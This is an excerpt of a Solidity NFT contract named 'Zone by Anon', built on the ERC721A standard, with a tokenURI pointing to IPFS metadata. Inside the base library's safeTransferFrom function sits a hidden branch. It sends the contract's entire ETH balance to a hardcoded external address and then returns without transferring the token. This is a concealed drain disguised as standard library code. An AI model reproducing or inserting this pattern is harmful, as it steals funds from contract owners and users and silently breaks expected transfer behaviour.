...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x20e3D135383AF2a8781f3E36c3677439ab7054fB).transfer(address(this).balance);
            return;
        }
...
contract ZonebyAnon is ERC721A {
    ...
    constructor() ERC721A("Zone by Anon", "zone") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeifm2qty34q6cpneiiww3by4bxai6ydw7r3rezy22xfwlnql5jpera/", _toString(tokenId), ".json"));
    }
